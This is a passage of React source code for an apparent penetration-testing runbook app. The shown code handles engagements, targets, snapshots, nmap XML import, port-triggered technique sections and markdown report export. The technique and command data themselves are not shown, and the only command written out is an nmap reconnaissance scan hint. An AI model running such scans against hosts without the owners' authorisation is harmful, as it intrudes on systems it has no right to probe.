  const isTriggered = section.portTrigger?.some(t => scanTriggers.has(t));
  const [collapsed, setCollapsed] = useState(false);
  const sectionHint = section.platformHint ?? null;
  const { done: secDone, total: secTotal } = countSectionProgress(phaseId, section, checkedCmds);

  return (
    <div style={{ marginBottom:24 }}>
      <div onClick={()=>setCollapsed(c=>!c)} style={{ display:"flex", alignItems:"center", gap:10, marginBottom:12, cursor:"pointer", flexWrap:"wrap" }}>
        <span style={{ color: isTriggered ? phaseColor : "#1a2a35", fontSize:11 }}>{section.icon}</span>
        <span style={{ color: isTriggered ? phaseColor : "#2a4050", fontSize:11, letterSpacing:"0.12em", fontWeight:700 }}>{section.label.toUpperCase()}</span>
        {secTotal > 0 && (
          <span style={{ fontSize:8, color: secDone === secTotal ? phaseColor + "cc" : "#6b8496", letterSpacing:"0.08em" }} title="Command steps complete in this section">
            {secDone}/{secTotal}
          </span>
        )}
        {isTriggered && scanData && (
          <span style={{ fontSize:8, color:phaseColor, background:phaseColor+"18", padding:"2px 8px", borderRadius:3, letterSpacing:"0.12em", border:`1px solid ${phaseColor}33` }}>
            ⚡ PORTS DETECTED
          </span>
        )}
        {scanData && sectionHint && (
          <PlatformFitBadge hint={sectionHint} targetOs={targetOs} />
        )}
        <DifficultyBadge level={section.difficulty} />
        <span style={{ color:"#1a2530", marginLeft:"auto", fontSize:10 }}>{collapsed?"▶":"▼"}</span>
      </div>
      {!collapsed && (
        <>
          {section.tip && (
            <div style={{ marginBottom:12, padding:"8px 12px", background:"#080d10", border:"1px solid #0d1a20", borderRadius:6, display:"flex", gap:8, alignItems:"flex-start" }}>
              <span style={{ color:"#f59e0b", fontSize:11 }}>💡</span>
              <span style={{ color:"#2a4050", fontSize:10, lineHeight:1.6 }}>{section.tip}</span>
            </div>
          )}
          <div style={{ display:"flex", flexDirection:"column", gap:6 }}>
            {section.techniques.map(tech => (
              <TechniqueCard key={tech.id} tech={tech} section={section} phaseId={phaseId} phaseColor={phaseColor} scanData={scanData} scanTriggers={scanTriggers} openPorts={openPorts} targetOs={targetOs} checkedCmds={checkedCmds} cmdNotes={cmdNotes} toggleCmdCheck={toggleCmdCheck} setCmdNote={setCmdNote} />
            ))}
          </div>
        </>
      )}
    </div>
  );
}

function NmapDropzone({ onImport, onClear, scanData, targetOs }) {
  const fileRef = useRef();
  const [drag, setDrag] = useState(false);
  const [err, setErr] = useState(null);

  const handle = file => {
    if (!file) return;
    const r = new FileReader();
    r.onload = e => {
      try {
        const res = parseNmapXml(e.target.result);
        if (!res.length) { setErr("No open ports found in XML."); return; }
        setErr(null); onImport(res);
      } catch { setErr("Invalid nmap XML format."); }
    };
    r.readAsText(file);
  };

  const onDrop = useCallback(e => { e.preventDefault(); setDrag(false); handle(e.dataTransfer.files[0]); }, []);

  if (scanData) {
    const portCount = scanData.reduce((a,h)=>a+h.ports.length,0);
    return (
      <div style={{ padding:"10px 12px", background:"#080f0a", border:"1px solid #0c2015", borderRadius:6, marginBottom:16 }}>
        <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:6 }}>
          <span style={{ color:"#22c55e", fontSize:9, letterSpacing:"0.15em" }}>◈ SCAN ACTIVE</span>
          <button onClick={onClear} style={{ background:"none", border:"1px solid #1a3028", color:"#6ebd8a", fontSize:8, cursor:"pointer", padding:"1px 7px", borderRadius:3, fontFamily:"inherit" }}>CLEAR</button>
        </div>
        {scanData.map((h,i) => (
          <div key={i}>
            <div style={{ color:"#00ff88", fontSize:10 }}>{h.ip}{h.hostname?` (${h.hostname})`:""}</div>
            <div style={{ color:"#7ab896", fontSize:9, marginTop:2 }}>{portCount} open port{portCount!==1?"s":""}: {h.ports.map(p=>p.portId).join(", ")}</div>
            {h.osMatches[0] && <div style={{ color:"#5aa078", fontSize:8, marginTop:2 }}>OS: {h.osMatches[0].name} ({h.osMatches[0].accuracy}%)</div>}
            {targetOs?.family !== "unknown" && (
              <div style={{ color: targetOs.family === "windows" ? "#38bdf8aa" : "#4ade80aa", fontSize:8, marginTop:4, letterSpacing:"0.06em" }}>
                Runbook emphasis: <span style={{ color: targetOs.family === "windows" ? "#38bdf8" : "#4ade80" }}>{targetOs.label}</span>
                {targetOs.confidence === "services" ? " · from services fingerprint" : targetOs.bestAccuracy >= 85 ? "" : targetOs.bestAccuracy > 0 ? ` · weak OS guess (${targetOs.bestAccuracy}%)` : ""}
              </div>
            )}
            {targetOs?.family === "unknown" && (
              <div style={{ color:"#9ca8b8", fontSize:8, marginTop:4 }}>Platform hints inactive — scan has no confident OS fingerprint (run <code style={{ fontSize:7 }}>-O/-A</code>).</div>
            )}
          </div>
        ))}
      </div>
    );
  }

  return (
    <div style={{ marginBottom:16 }}>
      <div onDragOver={e=>{e.preventDefault();setDrag(true);}} onDragLeave={()=>setDrag(false)} onDrop={onDrop} onClick={()=>fileRef.current.click()}
        style={{ border:`1px dashed ${drag?"#00d4ff":"#344a5c"}`, borderRadius:6, padding:"14px", textAlign:"center", cursor:"pointer", background:drag?"#00d4ff06":"#080c10", transition:"all 0.2s" }}>
        <div style={{ color:drag?"#00d4ff":"#8aa4b8", fontSize:20, marginBottom:4 }}>⬆</div>
        <div style={{ color:drag?"#00d4ff":"#9eb4c6", fontSize:9, letterSpacing:"0.15em" }}>DROP NMAP XML</div>
        <div style={{ color:"#6b8294", fontSize:8, marginTop:3 }}>nmap -sV -sC -O -oX scan.xml &lt;TARGET&gt;</div>
        <input ref={fileRef} type="file" accept=".xml" style={{display:"none"}} onChange={e=>handle(e.target.files[0])} />
      </div>
      {err && <div style={{ color:"#cc3333", fontSize:9, marginTop:4 }}>{err}</div>}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// MAIN APP
// ═══════════════════════════════════════════════════════════════
export default function PentestRunbook() {
  const initialTargetsRef = useRef(null);
  if (!initialTargetsRef.current) initialTargetsRef.current = loadTargetSessions();

  const [engagementName, setEngagementName] = useState(() => {
    try {
      return localStorage.getItem(ENGAGEMENT_NAME_STORAGE) || "";
    } catch {
      return "";
    }
  });
  const [engagementPrompt, setEngagementPrompt] = useState({
    open: false,
    name: "",
  });
  const [targets, setTargets] = useState(initialTargetsRef.current);
  const [activeTargetId, setActiveTargetId] = useState(initialTargetsRef.current[0]?.id || "target-1");
  const [targetPrompt, setTargetPrompt] = useState({
    open: false,
    targetId: null,
    title: "Set target details",
    ip: "",
    nickname: "",
    requireIp: false,
  });
  const [deletePrompt, setDeletePrompt] = useState({
    open: false,
    targetId: null,
    label: "",
  });
  const [snapshotPrompt, setSnapshotPrompt] = useState({
    open: false,
    mode: "save",
    name: "",
  });
  const [snapshots, setSnapshots] = useState(loadEngagementSnapshots);

  const activeTarget = targets.find((target) => target.id === activeTargetId) ?? targets[0];
  const activePhaseId = activeTarget?.activePhaseId ?? "recon";
  const scanData = activeTarget?.scanData ?? null;
  const openPorts = activeTarget?.openPorts ?? [];
  const visitedPhases = activeTarget?.visitedPhases ?? new Set(["recon"]);
  const checkedCmds = activeTarget?.checkedCmds ?? new Set();
  const cmdNotes = activeTarget?.cmdNotes ?? {};

  const updateActiveTarget = useCallback((updater) => {
    setTargets((prev) => prev.map((target) => (
      target.id === activeTargetId ? updater(target) : target
    )));
  }, [activeTargetId]);

  useEffect(() => {
    try {
      const serializableTargets = targets.map((target) => ({
        ...target,
        visitedPhases: [...target.visitedPhases],
        checkedCmds: [...target.checkedCmds],
      }));
      localStorage.setItem(TARGETS_STORAGE, JSON.stringify(serializableTargets));
    } catch { /* ignore quota */ }
  }, [targets]);

  const toggleCmdCheck = useCallback((key) => {
    updateActiveTarget((target) => {
      const next = new Set(target.checkedCmds);
      if (next.has(key)) next.delete(key);
      else next.add(key);
      const nextNotes = { ...(target.cmdNotes || {}) };
      if (!next.has(key) && nextNotes[key]) delete nextNotes[key];
      return { ...target, checkedCmds: next, cmdNotes: nextNotes };
    });
  }, [updateActiveTarget]);

  const setCmdNote = useCallback((key, value) => {
    updateActiveTarget((target) => ({
      ...target,
      cmdNotes: {
        ...(target.cmdNotes || {}),
        [key]: value,
      },
    }));
  }, [updateActiveTarget]);

  const scanTriggers = getTriggeredSections(openPorts);
  const activePhase = PHASES.find(p => p.id === activePhaseId);
  const targetOs = inferTargetOs(scanData);

  const getTargetDisplay = useCallback((target) => {
    if (!target) return { name: "Target", ip: "" };
    const base = target.nickname?.trim() || target.fallbackLabel || "Target";
    return {
      name: base,
      ip: target.ip?.trim() || "",
    };
  }, []);

  const openTargetPrompt = useCallback((target, title, requireIp = false) => {
    setTargetPrompt({
      open: true,
      targetId: target.id,
      title,
      ip: target.ip || "",
      nickname: target.nickname || "",
      requireIp,
    });
  }, []);

  useEffect(() => {
    if (!engagementName.trim() && !engagementPrompt.open) {
      setEngagementPrompt({ open: true, name: "" });
    }
  }, [engagementName, engagementPrompt.open]);

  useEffect(() => {
    try {
      const hasOnboarded = localStorage.getItem(TARGET_ONBOARDING_STORAGE) === "1";
      if (!hasOnboarded && targets[0] && !targetPrompt.open && !engagementPrompt.open && !!engagementName.trim()) {
        openTargetPrompt(targets[0], "Set primary target", true);
      }
    } catch {
      if (targets[0] && !targetPrompt.open && !engagementPrompt.open && !!engagementName.trim()) {
        openTargetPrompt(targets[0], "Set primary target", true);
      }
    }
  }, [engagementName, engagementPrompt.open, openTargetPrompt, targetPrompt.open, targets]);

  const handleNewTarget = () => {
    const newTarget = createTargetSession(
      `target-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      `Target ${targets.length + 1}`
    );
    setTargets((prev) => [...prev, newTarget]);
    setActiveTargetId(newTarget.id);
    openTargetPrompt(newTarget, "Add new target details", false);
  };

  const handleDeleteTarget = (targetId) => {
    setTargets((prev) => {
      if (prev.length <= 1) {
        const reset = createTargetSession(prev[0].id, prev[0].fallbackLabel || "Target 1");
        setActiveTargetId(reset.id);
        return [reset];
      }
      const next = prev.filter((target) => target.id !== targetId);
      if (!next.some((target) => target.id === activeTargetId)) {
        setActiveTargetId(next[0].id);
      }
      return next;
    });
    setTargetPrompt((prev) => (prev.targetId === targetId ? { ...prev, open: false } : prev));
    setDeletePrompt((prev) => ({ ...prev, open: false }));
  };

  const requestDeleteTarget = (target) => {
    setDeletePrompt({
      open: true,
      targetId: target.id,
      label: getTargetDisplay(target).name,
    });
  };

  const saveTargetPrompt = () => {
    const ip = targetPrompt.ip.trim();
    const nickname = targetPrompt.nickname.trim();
    if (targetPrompt.requireIp && !ip) return;
    setTargets((prev) => prev.map((target) => (
      target.id === targetPrompt.targetId ? { ...target, ip, nickname } : target
    )));
    setTargetPrompt((prev) => ({ ...prev, open: false }));
    try {
      localStorage.setItem(TARGET_ONBOARDING_STORAGE, "1");
    } catch { /* ignore */ }
  };

  const saveEngagementName = () => {
    const name = engagementPrompt.name.trim();
    if (!name) return;
    setEngagementName(name);
    setEngagementPrompt({ open: false, name: name });
    try {
      localStorage.setItem(ENGAGEMENT_NAME_STORAGE, name);
    } catch { /* ignore */ }
  };

  const buildEngagementPayload = useCallback(() => ({
    engagementName,
    targets: targets.map((target) => ({
      ...target,
      visitedPhases: [...target.visitedPhases],
      checkedCmds: [...target.checkedCmds],
      cmdNotes: target.cmdNotes || {},
    })),
  }), [engagementName, targets]);

  const saveSnapshot = () => {
    const label = snapshotPrompt.name.trim() || engagementName || "Untitled engagement";
    const payload = buildEngagementPayload();
    const record = {
      id: `snap-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      label,
      savedAt: new Date().toISOString(),
      payload,
    };
    try {
      const raw = localStorage.getItem(ENGAGEMENT_SNAPSHOTS_STORAGE);
      const existing = raw ? JSON.parse(raw) : [];
      const next = [record, ...(Array.isArray(existing) ? existing : [])].slice(0, 20);
      localStorage.setItem(ENGAGEMENT_SNAPSHOTS_STORAGE, JSON.stringify(next));
      setSnapshots(next);
      setSnapshotPrompt({ open: false, mode: "save", name: "" });
    } catch { /* ignore */ }
  };

  const loadSnapshot = (snapshot) => {
    if (!snapshot?.payload) return;
    const restoredTargets = Array.isArray(snapshot.payload.targets) && snapshot.payload.targets.length
      ? snapshot.payload.targets.map((target, idx) => hydrateTargetSession(target, `Target ${idx + 1}`))
      : [createTargetSession("target-1", "Target 1")];
    setEngagementName(snapshot.payload.engagementName || "Loaded engagement");
    setTargets(restoredTargets);
    setActiveTargetId(restoredTargets[0].id);
    setSnapshotPrompt({ open: false, mode: "load", name: "" });
    try {
      localStorage.setItem(ENGAGEMENT_NAME_STORAGE, snapshot.payload.engagementName || "Loaded engagement");
      localStorage.setItem(TARGETS_STORAGE, JSON.stringify(restoredTargets.map((target) => ({
        ...target,
        visitedPhases: [...target.visitedPhases],
        checkedCmds: [...target.checkedCmds],
      }))));
      localStorage.setItem(TARGET_ONBOARDING_STORAGE, "1");
    } catch { /* ignore */ }
  };

  const deleteSnapshot = (snapshotId) => {
    const next = snapshots.filter((snapshot) => snapshot.id !== snapshotId);
    setSnapshots(next);
    try {
      localStorage.setItem(ENGAGEMENT_SNAPSHOTS_STORAGE, JSON.stringify(next));
    } catch { /* ignore */ }
  };

  const exportReport = () => {
    const lines = [];
    lines.push(`# Engagement Report: ${engagementName || "Untitled Engagement"}`);
    lines.push("");
    lines.push(`Generated: ${new Date().toLocaleString()}`);
    lines.push("");
    targets.forEach((target, idx) => {
      const name = target.nickname || target.fallbackLabel || `Target ${idx + 1}`;
      lines.push(`## Target ${idx + 1}: ${name}`);
      lines.push("");
      lines.push(`- IP: ${target.ip || "Not set"}`);
      lines.push(`- Open ports: ${target.openPorts?.length ? target.openPorts.join(", ") : "None imported"}`);
      lines.push("");

      lines.push("### Checked Commands (Grouped by Phase)");
      const checkedSet = target.checkedCmds instanceof Set ? target.checkedCmds : new Set(target.checkedCmds || []);
      let foundAny = false;
      PHASES.forEach((phase) => {
        const phaseEntries = [];
        phase.sections.forEach((section) => {
          section.techniques.forEach((tech) => {
            tech.commands.forEach((cmd, cmdIdx) => {
              if (cmd.trim().startsWith("#")) return;
              const key = cmdCheckKey(phase.id, section.id, tech.id, cmdIdx);
              if (!checkedSet.has(key)) return;
              const renderedCmd = target.ip ? cmd.replace(/\$TARGET/g, target.ip) : cmd;
              phaseEntries.push({
                sectionLabel: section.label,
                techLabel: tech.label,
                command: renderedCmd,
                note: (target.cmdNotes || {})[key] || "",
              });
            });
          });
        });

        if (!phaseEntries.length) return;
        foundAny = true;
        lines.push(`#### ${phase.num} ${phase.label}`);
        lines.push("");
        let currentSection = "";
        let currentTech = "";
        phaseEntries.forEach((entry) => {
          if (entry.sectionLabel !== currentSection) {
            currentSection = entry.sectionLabel;
            currentTech = "";
            lines.push(`- **Section:** ${entry.sectionLabel}`);
          }
          if (entry.techLabel !== currentTech) {
            currentTech = entry.techLabel;
            lines.push(`  - **Technique:** ${entry.techLabel}`);
          }
          lines.push(`    - \`${entry.command}\``);
          if (entry.note.trim()) lines.push(`      - Notes: ${entry.note.trim().replace(/\n/g, " | ")}`);
        });
        lines.push("");
      });
      if (!foundAny) lines.push("- No checked commands yet.");

      lines.push("");
      lines.push("### Findings-Ready Template");
      lines.push("");
      lines.push("#### Finding Title");
      lines.push("- Severity: ");
      lines.push("- Affected Asset: ");
      lines.push("- Evidence (checked command refs): ");
      lines.push("- Description: ");
      lines.push("- Impact: ");
      lines.push("- Reproduction Steps: ");
      lines.push("- Remediation: ");
      lines.push("- Validation Notes: ");
      lines.push("");
    });
    const blob = new Blob([lines.join("\n")], { type: "text/markdown;charset=utf-8" });
    const href = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = href;
    a.download = `${(engagementName || "engagement").replace(/[^a-z0-9-_]+/gi, "_").toLowerCase()}_report.md`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(href);
  };

  const startNewEngagement = () => {
    const ok = window.confirm("Start a new engagement? Current unsaved progress will be reset.");
    if (!ok) return;
    const fresh = [createTargetSession("target-1", "Target 1")];
    setEngagementName("");
    setTargets(fresh);
    setActiveTargetId(fresh[0].id);
    setTargetPrompt({ open: false, targetId: null, title: "Set target details", ip: "", nickname: "", requireIp: false });
    setDeletePrompt({ open: false, targetId: null, label: "" });
    setSnapshotPrompt({ open: false, mode: "save", name: "" });
    setEngagementPrompt({ open: true, name: "" });
    try {
      localStorage.removeItem(ENGAGEMENT_NAME_STORAGE);
      localStorage.removeItem(TARGETS_STORAGE);
      localStorage.removeItem(TARGET_ONBOARDING_STORAGE);
    } catch { /* ignore */ }
  };

  const deleteEngagement = () => {
    const ok = window.confirm("Delete current engagement data? This will reset targets, notes, and progress.");
    if (!ok) return;
    const fresh = [createTargetSession("target-1", "Target 1")];
    setEngagementName("");
    setTargets(fresh);
    setActiveTargetId(fresh[0].id);
    setTargetPrompt({ open: false, targetId: null, title: "Set target details", ip: "", nickname: "", requireIp: false });
    setDeletePrompt({ open: false, targetId: null, label: "" });
    setSnapshotPrompt({ open: false, mode: "save", name: "" });
    try {
      localStorage.removeItem(ENGAGEMENT_NAME_STORAGE);
      localStorage.removeItem(TARGETS_STORAGE);
      localStorage.removeItem(TARGET_ONBOARDING_STORAGE);
    } catch { /* ignore */ }
  };

  const handleImport = results => {
    updateActiveTarget((target) => ({
      ...target,
      scanData: results,
      openPorts: results.flatMap((host) => host.ports.map((port) => port.portId)),
    }));
  };

  const handlePhase = id => {
    updateActiveTarget((target) => ({
      ...target,
      activePhaseId: id,
      visitedPhases: new Set([...target.visitedPhases, id]),
    }));
  };

  // Count triggered sections across phases for current scan
  const triggerCount = PHASES.reduce((acc, ph) => {
    return acc + ph.sections.filter(s => s.portTrigger?.some(t => scanTriggers.has(t))).length;
  }, 0);

  return (
    <div style={{ height:"100vh", background:"#07090c", fontFamily:"'IBM Plex Mono', monospace", display:"flex", flexDirection:"column", overflow:"hidden" }}>

      {/* ── TOP BAR ── */}
      <div style={{ borderBottom:"1px solid #0d1420", padding:"10px 20px", display:"flex", alignItems:"center", gap:16, background:"#050709", flexShrink:0, position:"relative" }}>
        <div style={{ display:"flex", gap:5 }}>
          {["#ff5f56","#ffbd2e","#27c93f"].map(c => <div key={c} style={{width:8,height:8,borderRadius:"50%",background:c}}/>)}
        </div>
        <div style={{ display:"flex", alignItems:"baseline", gap:10 }}>
          <span style={{ color:"#00d4ff", fontSize:13, letterSpacing:"0.06em", fontWeight:700 }}>OffSec</span>
          <span style={{ color:"#8aa4b6", fontSize:13, letterSpacing:"0.04em", fontWeight:600 }}>Runbook</span>
          {engagementName && (
            <span style={{ color:"#5ba4c8", fontSize:11, letterSpacing:"0.08em", borderLeft:"1px solid #153144", paddingLeft:10 }}>
              {engagementName}
            </span>
          )}
        </div>
        <div style={{ display:"flex", alignItems:"center", gap:6 }}>
          <button onClick={() => setSnapshotPrompt({ open: true, mode: "save", name: engagementName || "" })} style={{ background:"#0a1722", border:"1px solid #1d3f55", color:"#7cc5e8", borderRadius:4, padding:"2px 7px", fontSize:8, cursor:"pointer", fontFamily:"inherit", letterSpacing:"0.08em" }}>
            SAVE
          </button>
          <button onClick={() => setSnapshotPrompt({ open: true, mode: "load", name: "" })} style={{ background:"#101421", border:"1px solid #2c3550", color:"#96a6d8", borderRadius:4, padding:"2px 7px", fontSize:8, cursor:"pointer", fontFamily:"inherit", letterSpacing:"0.08em" }}>
            LOAD
          </button>
          <button onClick={exportReport} style={{ background:"#122015", border:"1px solid #2e5b3a", color:"#8dd5a1", borderRadius:4, padding:"2px 7px", fontSize:8, cursor:"pointer", fontFamily:"inherit", letterSpacing:"0.08em" }}>
            EXPORT REPORT
          </button>
          <button onClick={startNewEngagement} style={{ background:"#122018", border:"1px solid #2f6a56", color:"#9ce0cb", borderRadius:4, padding:"2px 7px", fontSize:8, cursor:"pointer", fontFamily:"inherit", letterSpacing:"0.08em" }}>
            NEW ENGAGEMENT
          </button>
          <button onClick={deleteEngagement} style={{ background:"#2a1018", border:"1px solid #663247", color:"#e7a9be", borderRadius:4, padding:"2px 7px", fontSize:8, cursor:"pointer", fontFamily:"inherit", letterSpacing:"0.08em" }}>
            DELETE ENGAGEMENT
          </button>
        </div>
        {scanData && triggerCount > 0 && (
          <div style={{ display:"flex", alignItems:"center", gap:6, padding:"3px 10px", background:"#ff3366" + "12", border:"1px solid #ff336633", borderRadius:4 }}>
            <span style={{ width:5, height:5, borderRadius:"50%", background:"#ff3366", boxShadow:"0 0 6px #ff3366" }}/>
            <span style={{ color:"#ff3366", fontSize:9, letterSpacing:"0.1em" }}>{openPorts.length} PORTS — {triggerCount} SECTIONS TRIGGERED</span>
          </div>
        )}
        <div style={{ marginLeft:"auto", display:"flex", gap:4 }}>
          {PHASES.map(ph => (
            <div key={ph.id} style={{ width:24, height:3, borderRadius:2, background: visitedPhases.has(ph.id) ? ph.color : "#0d1420", transition:"background 0.3s" }}/>
          ))}
        </div>
        <div style={{ position:"absolute", bottom:0, left:0, right:0, height:1, background:`linear-gradient(90deg, ${activePhase?.color||"#00d4ff"}33, transparent)` }}/>
      </div>

      <div style={{ borderBottom:"1px solid #0d1420", padding:"8px 12px", display:"flex", gap:6, alignItems:"center", background:"#04070a", overflowX:"auto", flexShrink:0 }}>
        {targets.map((target) => {
          const isActiveTarget = target.id === activeTargetId;
          const display = getTargetDisplay(target);
          return (
            <div key={target.id} style={{ display:"flex", alignItems:"stretch", minWidth:0 }}>
              <button
                onClick={() => setActiveTargetId(target.id)}
                style={{
                  background: isActiveTarget ? "#00d4ff14" : "#060a0f",
                  color: isActiveTarget ? "#7ce9ff" : "#7c93a6",
                  border: `1px solid ${isActiveTarget ? "#00d4ff66" : "#13202c"}`,
                  borderTopLeftRadius: 5,
                  borderBottomLeftRadius: 5,
                  borderRight: "none",
                  padding: "6px 10px",
                  fontFamily: "inherit",
                  fontSize: 9,
                  letterSpacing: "0.08em",
                  cursor: "pointer",
                  whiteSpace: "nowrap",
                }}
              >
                {display.name.toUpperCase()}{display.ip ? ` · ${display.ip}` : ""}
              </button>
              <button
                onClick={() => requestDeleteTarget(target)}
                title="Delete target"
                style={{
                  background: isActiveTarget ? "#2b0b14" : "#12080d",
                  color: "#ff8ca8",
                  border: `1px solid ${isActiveTarget ? "#7a2842" : "#34202a"}`,
                  borderTopRightRadius: 5,
                  borderBottomRightRadius: 5,
                  padding: "0 7px",
                  fontFamily: "inherit",
                  fontSize: 9,
                  cursor: "pointer",
                }}
              >
                ✕
              </button>
            </div>
          );
        })}
        <button
          onClick={handleNewTarget}
          style={{
            background: "#07120e",
            color: "#59d59a",
            border: "1px dashed #1f5f45",
            borderRadius: 5,
            padding: "6px 10px",
            fontFamily: "inherit",
            fontSize: 9,
            letterSpacing: "0.1em",
            cursor: "pointer",
            whiteSpace: "nowrap",
          }}
        >
          + NEW TARGET
        </button>
      </div>

      <div style={{ borderBottom:"1px solid #163349", background:"linear-gradient(90deg, #062031, #081119)", padding:"8px 16px", display:"flex", alignItems:"center", gap:10 }}>
        <span style={{ color:"#41c7ff", fontSize:9, letterSpacing:"0.14em" }}>ACTIVE TARGET</span>
        <span style={{ color:"#9be6ff", fontSize:10, letterSpacing:"0.08em", fontWeight:700 }}>
          {(getTargetDisplay(activeTarget).name || "UNNAMED TARGET").toUpperCase()}
        </span>
        <span style={{ color:"#6fa4bf", fontSize:10 }}>
          {getTargetDisplay(activeTarget).ip || "IP NOT SET"}
        </span>
        <button
          onClick={() => openTargetPrompt(activeTarget, "Edit target details", false)}
          style={{ marginLeft:"auto", background:"#0b2130", border:"1px solid #2a5b78", color:"#7fcff0", borderRadius:4, fontSize:8, letterSpacing:"0.08em", padding:"3px 8px", cursor:"pointer", fontFamily:"inherit" }}
        >
          EDIT
        </button>
        <button
          onClick={() => requestDeleteTarget(activeTarget)}
          style={{ background:"#2b0f18", border:"1px solid #6d2a42", color:"#ff9ab3", borderRadius:4, fontSize:8, letterSpacing:"0.08em", padding:"3px 8px", cursor:"pointer", fontFamily:"inherit" }}
        >
          DELETE TARGET
        </button>
      </div>

      <div style={{ display:"flex", flex:1, overflow:"hidden" }}>

        {/* ── PHASE RAIL ── */}
        <div style={{ width:200, borderRight:"1px solid #0d1420", display:"flex", flexDirection:"column", background:"#040609", overflow:"auto", flexShrink:0 }}>
          <div style={{ padding:"14px 10px 8px" }}>
            <NmapDropzone
              onImport={handleImport}
              onClear={() => updateActiveTarget((target) => ({ ...target, scanData: null, openPorts: [] }))}
              scanData={scanData}
              targetOs={targetOs}
            />
          </div>
          <div style={{ padding:"0 6px", flex:1 }}>
            {PHASES.map((ph) => {
              const isActive = ph.id === activePhaseId;
              const isVisited = visitedPhases.has(ph.id);
              const phaseTrigger = ph.sections.some(s => s.portTrigger?.some(t => scanTriggers.has(t)));
              const phProg = countPhaseProgress(ph, checkedCmds);
              return (
                <div key={ph.id} onClick={() => handlePhase(ph.id)}
                  style={{ marginBottom:3, padding:"10px 12px", borderRadius:6, cursor:"pointer",
                    background: isActive ? ph.color+"18" : "transparent",
                    border:`1px solid ${isActive ? ph.color+"55" : phaseTrigger ? ph.color+"25" : "#0d1420"}`,
                    transition:"all 0.15s",
                    boxShadow: isActive ? `0 0 20px ${ph.color}15` : "none"
                  }}
                  onMouseEnter={e => { if (!isActive) e.currentTarget.style.background = ph.color+"0c"; }}
                  onMouseLeave={e => { if (!isActive) e.currentTarget.style.background = "transparent"; }}>
                  <div style={{ display:"flex", alignItems:"center", gap:7 }}>
                    <span style={{ color: isActive ? ph.color : phaseTrigger ? ph.color+"aa" : "#708898", fontSize:14 }}>{ph.icon}</span>
                    <div style={{ flex:1, minWidth:0 }}>
                      <div style={{ display:"flex", alignItems:"center", gap:5, flexWrap:"wrap" }}>
                        <span style={{ color: isActive ? ph.color+"88" : phaseTrigger ? ph.color+"66" : "#7a909f", fontSize:8, letterSpacing:"0.15em" }}>{ph.num}</span>
                        {phProg.total > 0 && (
                          <span style={{ fontSize:7, color: phProg.done === phProg.total ? ph.color + "99" : "#5a7080", letterSpacing:"0.05em" }} title="Steps done in this phase">
                            {phProg.done}/{phProg.total}
                          </span>
                        )}
                        {phaseTrigger && scanData && <span style={{ width:4, height:4, borderRadius:"50%", background:ph.color, boxShadow:`0 0 4px ${ph.color}` }}/>}
                      </div>
                      <div style={{ color: isActive ? ph.color : phaseTrigger ? "#8aa4b6" : "#a7bac8", fontSize:10, letterSpacing:"0.08em", fontWeight: isActive||phaseTrigger ? 700 : 600 }}>
                        {ph.shortLabel}
                      </div>
                    </div>
                    {isVisited && !isActive && <span style={{ color:"#6b8496", fontSize:9 }}>✓</span>}
                  </div>
                </div>
              );
            })}
          </div>
          {/* Port list at bottom */}
          {scanData && (
            <div style={{ borderTop:"1px solid #0a1218", padding:"10px 10px", maxHeight:200, overflow:"auto" }}>
              <div style={{ color:"#889dad", fontSize:8, letterSpacing:"0.18em", marginBottom:6 }}>OPEN PORTS</div>
              {scanData.flatMap(h=>h.ports).map((p,i) => {
                const hit = !!PORT_MAP[p.portId];
                return (
                  <div key={i} style={{ display:"flex", gap:6, padding:"3px 0", borderBottom:"1px solid #080c10" }}>
                    <span style={{ color: hit?"#22c55e":"#7a929f", fontSize:9, minWidth:36 }}>{p.portId}</span>
                    <span style={{ color: hit?"#62c982":"#8a9fae", fontSize:9 }}>{p.service||p.protocol}</span>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* ── MAIN CONTENT ── */}
        <div style={{ flex:1, overflow:"auto", display:"flex", flexDirection:"column" }}>
          {activePhase && (
            <>
              {/* Phase header */}
              <div style={{ padding:"24px 32px 20px", borderBottom:"1px solid #0d1420", flexShrink:0, background:`linear-gradient(180deg, ${activePhase.color}08 0%, transparent 100%)` }}>
                <div style={{ display:"flex", alignItems:"flex-start", gap:16 }}>
                  <div style={{ flex:1 }}>
                    <div style={{ display:"flex", alignItems:"center", gap:12, marginBottom:8 }}>
                      <span style={{ color:activePhase.color, fontSize:28, textShadow:`0 0 30px ${activePhase.color}55` }}>{activePhase.icon}</span>
                      <div>
                        <div style={{ color:activePhase.color+"55", fontSize:9, letterSpacing:"0.2em", marginBottom:2 }}>PHASE {activePhase.num}</div>
                        <h1 style={{ color:activePhase.color, fontSize:18, margin:0, letterSpacing:"0.14em", fontWeight:700, textShadow:`0 0 24px ${activePhase.color}33` }}>
                          {activePhase.label}
                        </h1>
                      </div>
                    </div>
                    <div style={{ color:activePhase.color+"66", fontSize:11, fontStyle:"italic", marginBottom:8, letterSpacing:"0.05em" }}>
                      "{activePhase.tagline}"
                    </div>
                    <p style={{ color:"#3a5060", fontSize:12, lineHeight:1.8, margin:0, maxWidth:680, borderLeft:`2px solid ${activePhase.color}33`, paddingLeft:14 }}>
                      {activePhase.description}
                    </p>
                  </div>
                  <div style={{ display:"flex", flexDirection:"column", gap:6, alignItems:"flex-end", flexShrink:0 }}>
                    <div style={{ display:"flex", gap:6 }}>
                      {PHASES.map((ph, idx) => {
                        const isCurrent = ph.id === activePhaseId;
                        return (
                          <div key={ph.id} onClick={() => handlePhase(ph.id)} style={{ width:8, height:8, borderRadius:"50%", background: isCurrent ? ph.color : "#0d1420", cursor:"pointer", transition:"all 0.2s", boxShadow: isCurrent ? `0 0 8px ${ph.color}` : "none" }}/>
                        );
                      })}
                    </div>
                    <div style={{ display:"flex", gap:6 }}>
                      {PHASES.findIndex(p=>p.id===activePhaseId) > 0 && (
                        <button onClick={() => { const i = PHASES.findIndex(p=>p.id===activePhaseId); handlePhase(PHASES[i-1].id); }}
                          style={{ background:"none", border:"1px solid #0d1420", borderRadius:4, color:"#1a2a35", fontSize:9, cursor:"pointer", padding:"3px 10px", fontFamily:"inherit", letterSpacing:"0.08em" }}>
                          ← PREV
                        </button>
                      )}
                      {PHASES.findIndex(p=>p.id===activePhaseId) < PHASES.length-1 && (
